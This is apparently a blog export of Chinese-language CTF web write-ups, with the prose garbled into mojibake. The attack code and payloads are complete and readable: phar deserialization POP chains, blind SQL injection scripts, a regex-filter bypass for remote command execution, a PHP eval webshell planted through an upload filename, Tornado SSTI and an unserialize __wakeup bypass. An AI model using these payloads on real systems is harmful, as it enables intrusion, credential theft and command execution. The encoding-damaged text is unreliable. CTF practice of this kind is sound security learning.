æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚ phar.php: 12345678910111213&lt;?php class TestObject { } $phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub $o = new TestObject(); $o -&gt; data='hu3sky'; $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();?&gt; è®¿é—®å,ä¼šç”Ÿæˆä¸€ä¸ªphar.pharåœ¨å½“å‰ç›®å½•ä¸‹ã€‚ç”¨winhexæ‰“å¼€å¯ä»¥æ˜æ˜¾çš„çœ‹åˆ°meta-dataæ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„ã€‚æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š phar_fan.php 123456789&lt;?phpclass TestObject{ function __destruct() { echo $this -&gt; data; // TODO: Implement __destruct() method. }}include('phar://phar.phar');?&gt; è¾“å‡ºhu3sky åˆ©ç”¨ç‚¹å‰é¢è¯´é“ï¼Œphpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œå°±æ˜¯é‚£æ®µä»£ç ï¼Œå¯¹å…¶ä»–æ˜¯æ²¡æœ‰è¦æ±‚çš„ï¼Œä¹Ÿå°±æ„å‘³ç€ï¼Œæˆ‘ä»¬å¯ä»¥å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ï¼ 12345678910111213&lt;?php class TestObject { } $phar = new Phar('phar.phar'); $phar -&gt; startBuffering(); $phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;'); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ $phar -&gt;addFromString('test.txt','test'); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $object = new TestObject(); $object -&gt; data = 'hu3sky'; $phar -&gt; setMetadata($object); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest $phar -&gt; stopBuffering();?&gt; æ„é€ ä»£ç 1234567891011121314151617eval.php&lt;?phpclass AnyClass{ var $output = 'echo &quot;ok&quot;;'; function __destruct() { eval($this -&gt; output); }}$phar = new Phar('phar.phar');$phar -&gt; stopBuffering();$phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;');$phar -&gt; addFromString('test.txt','test');$object = new AnyClass();$object -&gt; output= 'phpinfo();';$phar -&gt; setMetadata($object);$phar -&gt; stopBuffering(); ç†è§£ä¸€ä¸‹ï¼špharçš„å®ç°è¿‡ç¨‹åº”è¯¥ä¸ºï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªpharæ–‡ä»¶ï¼Œå¯¹äºè¿™ä¸ªç±»çš„metaâ€”dataæ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„ å½“ä½ è¯»å–ä»–æ˜¯åˆ™ä¼šè¿›è¡Œååºåˆ—åŒ–è¾“å‡º: è¡¥å……å‡ ç‚¹ï¼š1.pharæ˜¯ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œé‡Œé¢å­˜æ”¾ç€æˆ‘ä»¬è¦å‹ç¼©çš„æ–‡ä»¶ä»¥åŠä¸€äº›å­˜å‚¨çš„å±æ€§å¤´ä¿¡æ¯ï¼ˆä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜åœ¨ï¼‰ä¹‹ç±»ï¼Œå½“æ–‡ä»¶æ“ä½œå‡½æ•°é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶å°±ä¼šå°†æ•°æ®ååºåˆ—åŒ– åˆ©ç”¨æ¡ä»¶1.pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚2.å¦‚file_exists()ï¼Œfopen()ï¼Œfile_get_contents()ï¼Œfile()ç­‰æ–‡ä»¶æ“ä½œçš„å‡½æ•°è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€è·³æ¿â€ã€‚3.æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”::ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚é—®é¢˜ï¼šè¿™ä¸ªæœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•åšè·³æ¿æ˜¯ä¸ºå•¥ï¼ŸæŒ‡çš„æ˜¯ä½¿ç”¨æ–‡ä»¶æ“ä½œå‡½æ•°çš„é­”æœ¯æ–¹æ³•è·³æ¿å—ï¼Ÿâ€”â€”æ˜¯çš„ å®æˆ˜æ€»è§‰å¾—è¿˜æ˜¯æœ‰å“ªé‡Œæ‡µæ‡µçš„æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•åšè·³æ¿æŒ‰ç…§æˆ‘çš„ç†è§£æ˜¯ï¼Œæˆ‘ä»¬çš„è¯»å–pharååºåˆ—åŒ–å‡ºæ¥çš„å†…å®¹å®¡è®¡ä¸‹ä»£ç ï¼Œæ„é€ ä¸€ä¸‹popï¼š 1234 public function close() { return file_get_contents($this-&gt;filename); }}//file ç±»ä¸­å­˜åœ¨ file_get_contentsæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥è¯»å–æ–‡ä»¶ï¼Œå¦‚ä½•åˆ°è¿™é‡Œæ¥ 123public function __destruct() { $this-&gt;db-&gt;close();}//æ€è·¯ç¬é—´æ¸…æ™°äº†ä¸å°‘ï¼Œå°†dbèµ‹å€¼ä¸ºfileï¼Œæ€ä¹ˆè·³ï¼Ÿ 123456public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } }//åˆ©ç”¨callé­”æœ¯æ–¹æ³•ï¼š__call è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨ popé“¾å¦‚ä¸‹ï¼šdb(file)-&gt;close()=&gt;__call($file(file)-&gt;close())=&gt;file_get_contents=&gt;FileListé‡Œé¢çš„destructè¾“å‡ºå›åˆ°é¡µé¢ä¸Š(å½“ç„¶ï¼Œè¿™é‡Œæ˜¯æˆ‘ä»¬è¦æ„é€ å…¥æ–‡ä»¶å†…ä»¤å…¶ååºåˆ—åŒ–çš„å†…å®¹) 1.æ„é€ pharæ–‡ä»¶ï¼š 123456789101112131415161718192021222324&lt;?phpclass User{ public $db;}class FileList{ private $files; public function __construct() { $this-&gt;files = array(new File()); }}class File{ public $filename='/flag.txt';}$user = new User();$user-&gt;db=new FileList();$phar = new Phar('phar.phar');$phar -&gt; stopBuffering();$phar -&gt; addFromString('test.txt','test');$phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;');$phar -&gt; setMetadata($user);$phar -&gt; stopBuffering(); ä¸çŸ¥é“ä¸ºå•¥ä¸‹åˆå°è¯•çš„æ—¶å€™å°±æ˜¯æ²¡æ³•å‡ºflagï¼Œå› æ­¤è¿˜å»å’Œwpå¯¹æ¯”äº†ä¸€ä¸‹ å‘ç°ä¹Ÿæ²¡å•¥ä¸åŒçš„å‘€ï¼Ÿç„¶åè¡¥å……ä¸€ä¸ªdownload.phpä¸­çš„ini_setini_set(â€œopen_basedirâ€, getcwd() . â€œ:/etc:/tmpâ€);è¿™ä¸ªå‡½æ•°æ‰§è¡Œåï¼Œæˆ‘ä»¬é€šè¿‡Webåªèƒ½è®¿é—®å½“å‰ç›®å½•ã€/etcå’Œ/tmpä¸‰ä¸ªç›®å½•ï¼Œæ‰€ä»¥åªèƒ½åœ¨delete.phpä¸­åˆ©ç”¨payloadï¼Œè€Œä¸æ˜¯download.phpã€‚ è¡¥å……ç¬¬äºŒä¸ªç‚¹ï¼Œä¸€ç›´ä¸æ˜¯å¾ˆæ¸…æ¥šåœ¨å“ªé‡Œè§£æäº†phar://äºæ˜¯åœ¨æœ¬åœ°è·‘äº†ä¸€ä¸‹åŸæ¥æ˜¯åœ¨è¿™ï¼Œç„¶åæ¥ä¸‹æ¥å°½ç®¡è¿”å›çš„falseï¼Œä½†æ˜¯pharå·²ç»è¢«è§£æäº†ï¼Œæ¥ä¸‹æ¥å°±ä¼šç»§ç»­æ‰§è¡Œååºåˆ—åŒ–æ“ä½œï¼Œè¿›å…¥æˆ‘ä»¬æ„é€ çš„é“¾äº† å°ç»“é¦–å…ˆæ˜¯æ€è·¯å°ç»“ï¼šå…¶å®æ˜¯å› ä¸ºä¸€å¼€å§‹é¢˜ç›®æç¤ºpharï¼Œæ‰€ä»¥è‡ªç„¶è€Œç„¶å°±è”æƒ³åˆ°è¦å»æ‰¾æºç ï¼Œçœ‹çœ‹åºåˆ—åŒ–çš„ç‚¹ï¼Œæ‰€ä»¥æ­¤æ—¶å°±ä¸ä¼šæƒ³åˆ°åœ¨ç™»å½•æ¡†sqlæ³¨å…¥æµªè´¹æ—¶é—´ï¼Œæ¥ä¸‹æ¥å°è¯•äº†å„ç§åŠŸèƒ½ï¼ŒæŠ“åŒ…ï¼Œå‘ç°ä¸‹è½½æ–‡ä»¶æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥ä¸‹è½½æºç æ¥å®¡è®¡ï¼Œæ„é€ ååºåˆ—è¯­å¥å°±å¯ä»¥äº† pharå­¦ä¹ å°ç»“1.pharæ˜¯ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œæˆ‘ä»¬æ„é€ çš„å†…å®¹ä¼šä»¥æ–‡ä»¶å±æ€§çš„å½¢å¼åºåˆ—åŒ–åå­˜åœ¨äºæ–‡ä»¶å¤´ä¸­2.pharåœ¨è¢«ä½¿ç”¨è¿‡ç¨‹ä¸­ä¼šè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œä¾‹å¦‚ï¼Œè¯»å–æ–‡ä»¶ï¼ŒæŸ¥è¯¢æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œæ€»ä¹‹å°±æ˜¯ä¸Šé¢é‚£å‡ ä¸ªæ–‡ä»¶å‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªæ€è·¯å°±æ˜¯å¦‚ä½•è®©æˆ‘ä»¬çš„æ–‡ä»¶è¢«è¯»å–ï¼Ÿ3.æˆ‘ä»¬ä¼ å…¥çš„åˆ é™¤æ–‡ä»¶çš„æ“ä½œ","link":"/2021/04/23/buuctf13/"},{"title":"buuctf15","text":"[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢è¿™é¢˜sqlæ³¨å…¥ï¼Œè¿‡æ»¤äº†ç©ºæ ¼æµ‹è¯•è¯­å¥ 1/**/and/**/1=11/**/and/**/1=2 ç›²æ³¨ï¼šéœ€è¦å†™è„šæœ¬=ï¼šæ„é€ payloadï¼š 1/**/and/**/substr(database(),1,1)='1'-- å­¦ä¹ ä¸€ä¸‹ä½¿ç”¨äºŒåˆ†æ³•è¿›è¡Œçˆ†ç ´ import requestsurl=&quot;http://b2b3ad31-796e-489d-8ad3-3dc8c3fc8257.node3.buuoj.cn/?stunum=&quot;s=requests.session()database=&quot;&quot;for i in range(1,10000): low =32 high=128 mid=(low+high)//2 while(low&lt;high): #payload_1=f&quot;1/**/and/**/ascii(substr(database(),{i},1))&gt;{mid}&quot; #payload_2=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='ctf'),{i},1))&gt;{mid}&quot; #payload_3=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),{i},1))&gt;{mid}&quot; payload_4= f&quot;1/**/and/**/ascii(substr((select/**/value/**/from/**/flag),{i},1))&gt;{mid}&quot; if &quot;Hi admin&quot; in s.get(url+payload_4).text: low = mid+1 else: high=mid mid=(low+high)//2 if(mid==32 or mid==132): break database +=chr(mid) print(database)print(database) äºŒåˆ†æ³•å¿«äº†ä¸æ˜¯ä¸€å€ä¸¤å€â€“ çœŸçš„è¶…çº§å¿«== [BSidesCF 2019]Kookieè®©æˆ‘ä»¬ä»¥adminçš„æ–¹å¼ç™»å½•ï¼Œå¹¶ä¸”æç¤ºcookieï¼Œæ‰€ä»¥æˆ‘å°±åœ¨cookieé‡Œæ·»åŠ ï¼Œusername=adminï¼Œå°±å¯ä»¥æ‹¿åˆ°flagäº† [FBCTF2019]RCEServiceè¾“å…¥jsonç±»å‹æ•°æ®:https://www.cnblogs.com/skysoot/archive/2012/04/17/2453010.html æµ‹è¯• {&quot;cmd&quot;:&quot;ls&quot;}//æœ‰å›æ˜¾ ç„¶åæƒ³catå´ä¸è¡Œï¼Œåº”è¯¥æ˜¯æœ‰è¿‡æ»¤==ï¼Œç„¶åå»çœ‹äº†ä¸€ä¸‹wpï¼Œè¯´æ˜¯æ¯”èµ›çš„æ—¶å€™æœ‰æºç : &lt;?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) { $json = $_REQUEST['cmd']; if (!is_string($json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } else { echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) { system($cmd); } else { echo 'Invalid input'; } echo '&lt;br/&gt;&lt;br/&gt;'; }}?&gt; ç¡®å®æ˜¯è¿‡æ»¤äº†å¾ˆå¤šå†…å®¹ è€ƒç‚¹åˆ†æä¸€ä¸‹: 1.å¦‚ä½•ç»•è¿‡è¿‡æ»¤ï¼Ÿç»•è¿‡preg_matchæ–¹æ³•æœ‰ä¸¤ç§:(1).preg_matchä¼šå»åŠªåŠ›çš„å»åŒ¹é…ç¬¬ä¸€è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¤šè¡Œçš„æ–¹å¼è¿›è¡Œç»•è¿‡: POST:cmd={ &quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;} ä¹Ÿå¯ä»¥ç›´æ¥åŠ ä¸€ä¸ª**%0A**è¿™ä¸ªä¹Ÿæ˜¯ä»£è¡¨æ¢è¡Œç¬¦(2).åˆ©ç”¨PCREå›æº¯ç»•è¿‡è„šæœ¬ import requestspayload = '{&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag &quot;,&quot;a&quot;:&quot;' + &quot;a&quot;*(1000000) + '&quot;}'res = requests.post(&quot;http://c7f06821-9d9b-468e-9f9f-21c3454d5c7d.node3.buuoj.cn/&quot;, data={&quot;cmd&quot;:payload})print(res.text) 2.ä¸ºä»€ä¹ˆæˆ‘ä»¬æ— æ³•ä½¿ç”¨catå‘½ä»¤ï¼Ÿputenv(â€˜PATH=/home/rceservice/jailâ€™)æ ¹æ®è¿™è¡Œæºç ï¼Œè¯»å‡ºjailåº”ç”¨äºå½“å‰ç¯å¢ƒï¼Œæˆ‘ä»¬èƒ½ä½¿ç”¨lsåº”è¯¥æ˜¯ jaliåŒ…å«äº†æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‹‰å‡ºcatçš„è·¯å¾„: {&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;} æ³¨æ„ï¼šLinuxå‘½ä»¤çš„ä½ç½®ï¼š/bin,/usr/binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨ï¼Œ/sbin,/usr/sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨ é€šè¿‡ä»¥ä¸ŠæˆåŠŸæ‹¿åˆ°flag [CISCN2019 æ€»å†³èµ› Day2 Web1]Easywebimage.php.bakæºç æ³„éœ²: &lt; ?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id='{$id}' or path='{$path}'&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); é¦–å…ˆè¿›è¡Œç»•è¿‡ï¼Œè¿™é‡Œæµ‹è¯•ä¸€ä¸‹ç»•è¿‡è¯­å¥: select * from images where id='' or path=''; &lt;?php$id=&quot;\\\\0&quot;;$id=addslashes($id);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);print($id); \\ å¯è§å½“æˆ‘ä»¬è¾“å…¥\\\\0çš„æ—¶å€™æœ€ç»ˆçš„ç»“æœæ˜¯\\é€ƒé€¸å‡ºæ¥äº†ï¼Œè®¾æƒ³ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬åœ¨idè¾“å…¥è¿™ä¸ªï¼Œé‚£ä¹ˆä¹…ä¼šå˜æˆ select * from images where id='\\' or path='';æ­¤æ—¶åé¢é‚£ä¸ªå•å¼•å·è¢«è½¬ä¹‰ï¼Œå˜æˆæ˜¯id=\\' or path='å¦‚æœæˆ‘ä»¬åœ¨pathåæ’å…¥æ³¨å…¥è¯­å¥or 1=1#ï¼Œå°†å˜æˆid='\\' or path=' or 1=1#' è¿™é‡Œè´´ä¸€ä¸‹ç›²æ³¨è„šæœ¬: import requestsurl = &quot;http://803aae5e-79fb-4520-960c-d67666295f67.node3.buuoj.cn/image.php?id=\\\\0&amp;path=&quot;s=requests.session()payload = &quot; or ascii(substr((select password from users),{},1))&gt;{}%23&quot;result = ''for i in range(0,100): high=127 low=32 mid= (low+high) // 2 while(high&gt;low): if 'JFIF' in s.get(url+payload.format(i,mid)).text: low=mid+1 else: high=mid mid=(low+high)//2 result +=chr(mid) print(result) è·‘å‡ºè´¦å·å¯†ç ï¼Œç™»é™†ä»¥åå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼šéšä¾¿ä¸Šä¼ äº†ä¸€ä¸ªå†…å®¹: I logged the file name you uploaded to logs/upload.d74bd5e2a76d1aa9b34f21ca9e866a8b.log.php. LOL æ— æ³•ä¸Šä¼ phpæ–‡ä»¶ ä½†æ˜¯å¯ä»¥å‘ç° æˆ‘ä»¬å­˜å…¥çš„æ–‡ä»¶åéƒ½å‡ºç°åœ¨äº†è¿™ä¸ªphpæ–‡ä»¶å½“ä¸­å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶åï¼Œé‚£ä¹ˆå°±ä¼šè¢«è¿™ä¸ªphpè§£æäº† ç”±äºphpè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çŸ­æ ‡ç­¾è¿›è¡Œç»•è¿‡:burpæŠ“åŒ…ï¼Œæ”¹æ–‡ä»¶åä¸º &lt;?=@eval($_POST['a']);?&gt; POSTæ•°æ®æˆ–è€…èšå‰‘è¿æ¥éƒ½è¡Œ a=system('cat /flag'); å°ç»“æœ‰ç‚¹ä¹…æ²¡åˆ·é¢˜äº†ã€ã€‚ã€‚ç½ªè¿‡ï¼Œè¿™æ¬¡ä¹Ÿæ˜¯æ”¶è·äº†ä¸å°‘ï¼Œæ„Ÿè§‰sqlçš„è°ƒè¯•æŠ€å·§æœ‰ç‚¹é—å¿˜äº†ï¼Œç›´æ¥å¤åˆ¶ä»£ç ä¼šæœ¬åœ°æµ‹è¯•å°±è¡Œäº†~","link":"/2021/05/15/buuctf15/"},{"title":"buuctf2","text":"easy_tornadoåœ¨hints.txtä¸­å‘ç°æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯éœ€è¦æ»¡è¶³åŒæ—¶è¾“å…¥ä»¥ä¸‹å†…å®¹ æˆ‘ä»¬ä¸çŸ¥é“cookie_secretæ‰€ä»¥è¿™é‡ŒMD5è§£ç ä¸€ä¸‹ç„¶åå»çœ‹ä¸€ä¸‹ md5(cookie_secret+md5(filename))619ae5434035a986a24fdc06520654a3å‘ç°è§£ä¸å¼€ï¼Œæ‰€ä»¥æ›´æ¢æ€è·¯çœ‹åˆ°welcome.txtæç¤ºrenderï¼ˆæ¸²æŸ“ï¼‰ï¼Œç»“åˆæ ‡é¢˜tornadoï¼ˆpythonæ¡†æ¶ï¼‰æ¨æµ‹å­˜åœ¨sstiæ³¨å…¥ å‡ºç°ä¸åŒå‚æ•°ï¼Œå»tornadoæŸ¥æ‰¾ä¸€ä¸‹å‚æ•°çœ‹çœ‹ï¼š å‘ç°cookie_secretï¼Œæƒ³æƒ³æœ‰æ²¡æœ‰è·å–åˆ°è¿™ä¸ªå†…å®¹çš„æ–¹æ³• ç”±äºæ˜¯tornadoæ¡†æ¶ï¼Œäºæ˜¯å»æŸ¥è¯¢äº†ï¼šcookie_secretåœ¨tornado.web.RequestHandlerå½“ä¸­ç”Ÿæˆ è€Œè¦è®¿é—®tornado.web.RequestHandlerçš„å¯¹è±¡ï¼Œéœ€è¦ä½¿ç”¨handlerï¼Œæ‰€ä»¥è¿™é‡Œçš„payloadå³ä¸º 1handler.settings å³å¯æ‹¿åˆ°ç§˜é’¥: 12/flag.txtflag in /fllllllllllllag è¿™é‡Œå†™äº†ä¸ªè„šæœ¬: 1234567import hashlibhash_encode='/fllllllllllllag'hash_encode = hashlib.md5(hash_encode.encode(&quot;utf-8&quot;)).hexdigest()hash_co_secret='5b1ce5ca-faa2-4f23-8b87-767c644f4baa'+hash_encodehash_encode=hashlib.md5(hash_co_secret.encode(&quot;utf-8&quot;)).hexdigest()print(hash_encode) æ‹“å±•å­¦ä¹ ï¼šTornado.web.Applicationçš„settingså‚æ•°: https://blog.csdn.net/ljphilp/article/details/47103745 æ€è·¯æ•´ç†åœ¨æ€è€ƒè¿™é¢˜çš„æ—¶å€™ä¸€ç›´åœ¨æƒ³èµµè€å¸ˆè¯´çš„é‡åˆ°ä¸æ‡‚çš„å°±å»æŸ¥ä¸€ä¸‹ç›¸å…³èµ„æ–™ï¼Œä¸€ç›´åœ¨æ€è€ƒè¿™å…¶ä¸­çš„æ€è€ƒé“¾ï¼šç»“åˆtornado render æˆ‘ä»¬å¤§è‡´å¯ä»¥æ¨æµ‹å‡ºæœ‰å…³pythonçš„æ¨¡æ¿æ³¨å…¥â€”â€”åœ¨æ‰¾åˆ°sstiæ³¨å…¥ç‚¹åï¼Œæˆ‘æ€è€ƒçš„æ˜¯é€šè¿‡å­ç±»è¿½è¸ªåˆ°cookie_secretä½†æ˜¯è¢«è¿‡æ»¤æ‰äº†å¤ªå¤šå†…å®¹ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™åº”è¯¥æ¢ä¸€ä¸ªæ€è·¯â€”â€”cookie_secretæ”¾åœ¨å“ªé‡Œï¼ŸæŸ¥åˆ°èµ„æ–™æ”¾åœ¨Tornado.web.Application.RequestHandler.settingsè¿™ä¸ªå½“ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è¿›å…¥è¿™ä¸ªå­ç±»æŸ¥è¯¢åˆ°settingå‘¢ï¼Ÿæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥å‘ç°è¿™ä¸ªä¸œè¥¿ï¼Œç„¶åæ¥ä¸‹æ¥å»æ„é€ è¯­å¥å»è¯•æ¢ã€‚ [æå®¢å¤§æŒ‘æˆ˜ 2019]PHPå¤‡ä»½æ–‡ä»¶æºç æ³„éœ²çš„äºšå­ï¼Œäºæ˜¯è¯•äº†ä¸€ä¸‹å‡ ä¸ªå¸¸è§çš„å¤‡ä»½ï¼Œå‘ç°www.zipå¤‡ä»½æ–‡ä»¶æ³„éœ²æ‰“å¼€index.phpå¾—åˆ°: 12345&lt;?php include 'class.php'; $select = $_GET['select']; $res=unserialize(@$select); ?&gt; ååºåˆ—åŒ–æ¼æ´ï¼Ÿå†çœ‹çœ‹å…¶ä»– 12345678910111213141516171819202122232425262728class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = 'guest'; } function __destruct(){ if ($this-&gt;password != 100) { echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); } if ($this-&gt;username === 'admin') { global $flag; echo $flag; }else{ echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!&quot;; die(); å…«æˆè¯•äº†ï¼Œçœ‹åˆ°è¿™ä¸ª_wakeup()å‡½æ•°äº†ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦ç»•è¿‡å‡½æ•°ï¼Œå»çœ‹çœ‹å¦‚ä½•å†™ç¨‹åº: 12345678910111213&lt;?phpclass Name{ public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } }$a=new Name('admin',100);//è¿™çš„100æ˜¯æ•°å­—ä¸æ˜¯stræ‰€ä»¥ä¸èƒ½åŠ å¼•å·ã€‚$b=serialize($a);$b=str_ireplace(&quot;:2:&quot;,&quot;:3:&quot;,$b);print($b);?&gt; ç»“æœ: 1O:+4:&quot;Name&quot;:3:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;} ä½†æ˜¯æˆ‘ä¸ç®¡å¦‚ä½•å°è¯•éƒ½æ²¡æœ‰å›æ˜¾ï¼Œäºæ˜¯æ‰“å¼€phpstormæ‰‹åŠ¨è°ƒè¯•äº†ä¸€ä¸‹å‘ç°æ˜¯å¯ä»¥è¿›å…¥flagçš„ è¿™ä¸ªæ—¶å€™å°±å¾ˆæ‡µäº†ï¼Œäºæ˜¯å»æŸ¥äº†ä¸€ä¸‹wp: **ä¸Šé¢æ˜¯publicå±æ€§æ—¶çš„usernameå’Œpasswordå‚æ•°ï¼Œä¸‹é¢æ˜¯privateå‚æ•°çš„ï¼Œå¯ä»¥çœ‹åˆ°Nameå’Œusernameä¹‹é—´éƒ½æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œ**å½“æˆ‘å¤åˆ¶åˆ°urlçš„æ—¶å€™è¿™ä¸ªæˆªæ–­å°±æ²¡äº†ï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸ª%00 1O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;} ä¸€ç‚¹ä½“ä¼š:åœ¨åšbuuçš„é¢˜ç›®çš„æ—¶å€™ï¼Œæ„Ÿè§‰æ•´ä½“æ€è·¯æ˜¯å¯ä»¥æœ‰äº†ï¼Œä½†æ˜¯æ€»æ˜¯ä¼šå¡åœ¨æŸäº›ç‚¹ï¼Œæ¯”å¦‚ä¸Šé¢è¿™ä¸ªï¼Œæˆ‘å°±ä¸æ¸…æ¥šprivateåŸæ¥å’Œglobalæœ‰è¿™ä¸ªä¸åŒï¼Œä»¥åé‡åˆ°è¿™ä¸­æƒ…å†µï¼Œè®°å¾—å»å¯¹æ¯”ä¸€ä¸‹publicï¼Œæˆ–è€…çœ‹ä¸€ä¸‹å’Œä»¥å‰åšè¿‡çš„é¢˜æ¯”å“ªé‡Œä¸ä¸€æ ·äº†ï¼Œå¯»æ‰¾çªç ´ç‚¹ã€‚ 